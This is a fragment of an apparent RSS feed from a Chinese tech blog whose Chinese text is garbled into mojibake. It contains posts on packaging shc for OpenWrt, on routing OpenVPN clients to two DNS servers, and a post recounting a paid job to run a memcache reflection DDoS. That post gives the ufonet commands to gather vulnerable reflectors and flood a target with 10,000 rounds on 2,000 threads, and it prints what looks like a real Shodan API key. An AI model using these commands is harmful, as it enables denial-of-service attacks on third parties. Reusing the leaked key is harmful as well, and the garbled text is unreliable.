&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;# OpenWrt. The &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;INSTALL_DIR&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; variable contains a command to prepare the install 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;# directory if it does not already exist.  Likewise &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;INSTALL_BIN&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; contains the 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;# command to copy the binary file from its current location (in our case the build
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;# directory) to the install directory.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;define Package/&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;PKG_NAME&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;/install  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;INSTALL_DIR&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;1&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;/bin
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;INSTALL_BIN&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;PKG_BUILD_DIR&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;/shc &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;1&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;/bin/
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;endef
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;# This line executes the necessary commands to compile our program.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;# The above define directives specify all the information needed, but this
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;# line calls BuildPackage which in turn actually uses this information to
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;# build a package.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;eval&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;call BuildPackage,&lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;PKG_NAME&lt;span class=&#34;k&#34;&gt;)))&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;8. Compile shc ipk without errors.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;make package/shc/compile V=99
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;9. Building process complete witout errors.  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;Now we have :  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;binary packages directory: source/bin/packages/aarch64_armv8-a/  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;[SHC_BIN] = ./bin/packages/aarch64_armv8-a/base/shc_3.8.9b_aarch64_armv8-a.ipk
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;10. Copy and install SHC .ipk to LEDE device.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;scp shc_3.8.9b_aarch64_armv8-a.ipk root@&amp;lt;LEDE device IP address or name&amp;gt;:/tmp/  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;ssh root@&amp;lt;LEDE device IP address or name&amp;gt; #IP usually 192.168.1.1  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;opkg install shc_3.8.9b_aarch64_armv8-a.ipk
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;11. Create test script and compile it to execute. (in LEDE shell)  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;ssh root@&amp;lt;LEDE device IP address or name&amp;gt; #IP usually 192.168.1.1
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;vi /tmp/1.sh  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;#!/bin/sh
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;echo &amp;#34;&lt;/span&gt;hahahaha&lt;span class=&#34;s2&#34;&gt;&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;shc -v -f /tmp/1.sh  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;/tmp/1.sh.x
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¿™é‡Œé¢æœ‰å‡ ä¸ªæ³¨æ„ç‚¹ï¼Œä¸€ä¸ªæ˜¯ç½‘ä¸Šæœ‰å¾ˆå¤šæ•™ç¨‹ï¼Œä¸Šå»å°±æ˜¯&lt;/p&gt;</description>
    </item>
    <item>
      <title>Freelancerä»»åŠ¡ä¹‹ä¸ƒmemcache æ”¾å¤§æ”»å‡»</title>
      <link>https://rendoumi.com/posts/20240124-freelancer_7/</link>
      <pubDate>Wed, 24 Jan 2024 10:01:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240124-freelancer_7/</guid>
      <description>&lt;p&gt;è¿™æ˜¯ä¸€æ¬¡å·®ç‚¹èš€æŠŠç±³çš„è¿‡ç¨‹å•Šï¼Œæœ€åäº‰è®®æ‹¿å›äº†è‡ªå·±çš„æ‰‹ç»­è´¹ï¼Œç™½å¹²äº†ä¸€åœºå•Šï¼ŒçœŸå¤Ÿå€’éœ‰çš„ã€‚&lt;/p&gt;
&lt;p&gt;éŸ©å›½äººè¦åå°„æ”»å‡»ã€‚&lt;/p&gt;
&lt;p&gt;é¦–å…ˆcloneé¡¹ç›®ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;git clone https://github.com/epsylon/ufonet  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;åŸç†å¾ˆæ¸…æ¥šï¼Œé€šè¿‡memcacheçš„æ¼æ´ï¼Œmemcacheå±…ç„¶æ˜¯UDPçš„ï¼Œä¼ªé€ æºåœ°å€ï¼Œå‘ä¸€å †è¯·æ±‚åˆ°æœ‰æ¼æ´çš„memchacheï¼Œå¼•èµ·åå°„æ”»å‡»ã€‚&lt;/p&gt;
&lt;p&gt;ä¸€å †æœ‰æ¼æ´çš„æœºå™¨ä»å“ªè·å¾—å‘¢ï¼Ÿè¿™ä¸ªéŸ©å›½äººçœŸçš„æœ‰Shodan APIï¼Œæ‰‹æ¦´å¼¹ï¼Ÿ ä»–çš„è´¦å·ï¼Œç¡®å®å¯ä»¥çœ‹åˆ°ä¸€å †æœ‰æ¯›ç—…çš„æœºå™¨&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0ptoLUtmkSJ8DbAvyZ8PevTRsyLoxEuN  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å®‰è£…python:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wget https://www.python.org/ftp/python/2.7.14/Python-2.7.14.tgz  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tar zxvf Python-2.7.14.tgz  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; Python-2.7.14  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;./configure --prefix&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/export/servers/Python2714
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;make  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;make install
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wget -O- &lt;span class=&#34;s2&#34;&gt;&amp;#34;https://bootstrap.pypa.io/get-pip.py&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; /export/servers/Python2714/bin/python
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/export/servers/Python2714/bin/pip install pycurl
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/export/servers/Python2714/bin/pip install geoip
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/export/servers/Python2714/bin/pip install whois
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/export/servers/Python2714/bin/pip install crypto
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/export/servers/Python2714/bin/pip install request
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å…ˆå»æ‹¿ä¸€å †æ¼æ´æœºå™¨çš„åˆ—è¡¨&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; ufonet  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/export/servers/Python2714/bin/python ./ufonet --sd &lt;span class=&#34;s1&#34;&gt;&amp;#39;botnet/dorks.txt&amp;#39;&lt;/span&gt; --sa
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è½°å‡»ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/export/servers/Python2714/bin/python ./ufonet./ufonet -a http://target.com -r &lt;span class=&#34;m&#34;&gt;10000&lt;/span&gt; --threads &lt;span class=&#34;m&#34;&gt;2000&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>Freelancerä»»åŠ¡ä¹‹å…«openvpnçš„DNSåˆ†å‘</title>
      <link>https://rendoumi.com/posts/20240124_freelancer_8/</link>
      <pubDate>Wed, 24 Jan 2024 10:00:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240124_freelancer_8/</guid>
      <description>&lt;p&gt;é›‡ä¸»ç»™äº†ä¸ªéš¾é¢˜ï¼Œä»–æ­å»ºäº†ä¸€ä¸ªopenvpnï¼Œå¹¶ä¸”æœ‰ä¸¤ä¸ªDNS Serverï¼Œä¸€ä¸ªæ˜¯å¸¦ADå¹¿å‘Šè¿‡æ»¤çš„ï¼Œä¸€ä¸ªæ˜¯ä¸å¸¦çš„ã€‚è¿™ä¸¤ä¸ªdnsæœåŠ¡åœ¨åŒä¸€ä¸ªæœºå™¨ä¸Šï¼Œç«¯å£ä¸åŒã€‚&lt;/p&gt;
&lt;p&gt;ä»–æƒ³è®©åœ¨openvpnçš„clientç«¯é…ç½®ä¸€ä¸‹ï¼Œè®©å®¢æˆ·ä½¿ç”¨ä¸åŒçš„dns serverã€‚&lt;/p&gt;
&lt;p&gt;æ‰¾äº†åŠå¤©ï¼Œæ²¡æœ‰èƒ½ä¿®æ”¹dns portçš„é…ç½®ã€‚&lt;/p&gt;
&lt;p&gt;äºæ˜¯æ›²çº¿æ•‘å›½ã€‚&lt;/p&gt;
&lt;p&gt;æ–¹æ¡ˆå¦‚ä¸‹ï¼šå®¢æˆ·ç«¯å›ºå®šIPï¼Œæ ¹æ®ä¸åŒçš„æ¥æºIPæ¥åˆ†å‘åˆ°ä¸åŒçš„DNSå»ã€‚&lt;/p&gt;
&lt;p&gt;æœ¬æ¥æ˜¯æƒ³ç”¨V2EXä¸€ä¸ªå“¥ä»¬è‡ªå·±å†™çš„gliderï¼Œå¼„äº†åŠå¤©ï¼Œä¸çŸ¥é“æ€ä¹ˆé…ï¼Œä¸è¿‡åŠŸèƒ½è‚¯å®šæ˜¯èƒ½å®ç°çš„ã€‚æœ€å·®å°±æ˜¯è‡ªå·±æ”¹goä»£ç äº†ã€‚&lt;/p&gt;
&lt;p&gt;å¿«é€Ÿèµ·è§ï¼Œç”¨äº†å¦å¤–ä¸€ä¸ªå“¥ä»¬çš„dns-dispatcherï¼Œå°±æ˜¯dnsåˆ†å‘ï¼Œglideræ˜¯å½»åº•çš„å„ç§ä»£ç†è½¬å‘ï¼Œé“¾æ¡ä»£ç†ï¼Œéå¸¸å¼ºæ‚ã€‚&lt;/p&gt;
&lt;p&gt;å…‹éš†dns-dispatcherä»£ç &lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;git clone https://github.com/cathuhoo/dns-dispatcher  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç¼–è¯‘ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;make  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;é…ç½®ï¼Œæˆ‘ä»¬åªé…ç½®äº†udpçš„53ç«¯å£ï¼Œæ ‡å‡†çš„DNSç«¯å£&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vi dns-dispatch.config  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; This is a &lt;span class=&#34;nb&#34;&gt;test&lt;/span&gt; configuration file
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;main&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;file_resolvers&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; resolvers.txt  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;file_policy&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; policy.txt  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;file_log&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; /var/log/dns-dispatch.log  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;file_pid&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; /var/run/dns-dispatch.pid  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;num_threads&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;service_port&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;53&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#tcpservice_port = 53&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;daemonize&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; yes  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;é…ç½®ç­–ç•¥ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vi policy.txt  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ip2 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; * &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Forward:bind2  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ip1 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; * &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Forward:bind1  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;é…ç½®ip1å’Œip2&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vi ip1  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;10.10.1.2
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vi ip2  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;10.10.1.3  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;é…ç½®bind1å’Œbind2ï¼Œä¸¤ä¸ªdnsåœ¨10.10.1.1ä¸Šï¼Œç«¯å£åˆ†åˆ«æ˜¯5301å’Œ5302&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vi resolvers.txt  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;bind1&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;10.10.1.1&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;5301&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;bind2&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;10.10.1.1&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;5302&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¿è¡Œï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo ./dns-dispatch -c dns-dispatch.config  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;OKï¼Œæå®šï¼Œæ‰€æœ‰çš„é…ç½®éƒ½åœ¨æ–‡ä»¶é‡Œï¼Œè¿˜æœ‰åˆ«çš„ç”¨æ³•ï¼Œå¤§å®¶ç”¨çš„è¯è‡ªå·±çœ‹æ–‡æ¡£å§ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>lxcä¸‹å¦‚ä½•è®©usbè®¾å¤‡pass throughç›´æ¥åˆ°è¾¾è™šæœº</title>
      <link>https://rendoumi.com/posts/20240124-lxc_usb_pass_through/</link>
      <pubDate>Wed, 24 Jan 2024 09:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240124-lxc_usb_pass_through/</guid>
